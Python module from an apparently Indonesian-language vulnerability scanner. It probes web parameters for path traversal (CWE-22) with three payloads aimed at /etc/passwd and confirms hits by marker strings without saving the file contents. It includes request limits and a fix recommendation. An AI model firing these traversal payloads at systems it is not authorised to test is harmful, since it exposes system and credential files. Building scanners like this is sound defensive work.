"""traversal — path traversal via file-like params (CWE-22, HIGH).

Teknik: parameter yang menerima path/file diuji dengan payload traversal
berlapis (../, ..%2f, ....//) menuju marker file PUBLIK (/etc/passwd).
Bukti = marker "root:" + ":/bin/" di respons — isi file TIDAK di-dump
(cease-on-data: cukup 1 baris marker teredaksi).

FP-guard:
  - marker wajib keduanya ("root:" DAN ":/bin/") — satu saja = FP (bisa
    berupa konten aplikasi yang kebetulan memuat kata "root");
  - maksimal 3 payload x 3 param per request-run (bounded);
  - tanpa param yang diberikan → skipped (tidak menebak).
"""

from __future__ import annotations

import re
from urllib.parse import urljoin, urlsplit

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding

_PAYLOADS = (
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
)
_MARKER1 = "root:"
_MARKER2 = ":/bin/"


def _marker_hit(body: str) -> bool:
    return _MARKER1 in body and _MARKER2 in body


class TraversalTool(Tool):
    name = "traversal"
    description = ("Path traversal via parameter (bounded 3 payload x 3 param, "
                   "/etc/passwd marker, konten tidak di-dump).")
    risk_tags = {"active"}
    source_skill = "manual-bb-12"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        host = urlsplit(base).hostname or ""
        path = str(args.get("path") or "/")
        params = [p for p in (args.get("params") or []) if p][:3]
        if not host or not params:
            return ToolResult(tool=self.name, ok=True,
                              data={"skipped": "no-host-or-params",
                                    "hint": "berikan params: nama parameter "
                                            "yang menerima path/file"})
        findings: list[Finding] = []
        data: dict = {"host": host, "path": path, "params": params, "probes": []}
        param_value = None
        for p in params:
            for payload in _PAYLOADS:
                if ctx.world.request_count >= ctx.max_requests:
                    break
                url = urljoin(base + "/", path.lstrip("/")) + \
                    ("&" if "?" in path else "?") + \
                    f"{p}={payload}"
                try:
                    ctx.throttle()
                    st, hd, body, _ms = http_engine.http_get(
                        url, timeout=ctx.timeout_s)
                except Exception as e:
                    data["probes"].append({"param": p, "payload": payload,
                                           "error": type(e).__name__})
                    continue
                ctx.world.request_count += 1
                hit = _marker_hit(body or "")
                data["probes"].append({"param": p, "payload": payload,
                                       "status": st, "marker": hit})
                if hit:
                    findings.append(Finding(
                        tool=self.name,
                        title=f"Path traversal via parameter '{p}' on {host}",
                        severity="high", cwe="CWE-22",
                        description=(
                            f"Parameter '{p}' pada {urlsplit(url).path} menerima "
                            f"payload traversal '{payload}' dan mengembalikan isi "
                            f"/etc/passwd (marker terverifikasi). Isi file TIDAK "
                            f"disimpan dalam bukti — cease-on-data. Attacker dapat "
                            f"membaca file arbitrer: konfigurasi, kredensial, "
                            f"source code."),
                        recommendation=(
                            "Validasi/normalisasi path input (allowlist basename), "
                            "chroot untuk proses yang relevan, dan jangan "
                            "menyusun path dari input mentah."),
                        target_url=base, param=p,
                        request=f"GET {urlsplit(url).path}?{p}=<traversal payload>",
                        response=f"HTTP {st}; marker /etc/passwd terverifikasi "
                                 f"(isi file tidak disimpan)",
                        confidence=1.0, source_skill=self.source_skill,
                        status="confirmed", evidence_kind="probe-pair"))
                    return ToolResult(tool=self.name, ok=True, data=data,
                                      findings=findings)  # cease: satu bukti cukup
        return ToolResult(tool=self.name, ok=True, data=data, findings=findings)
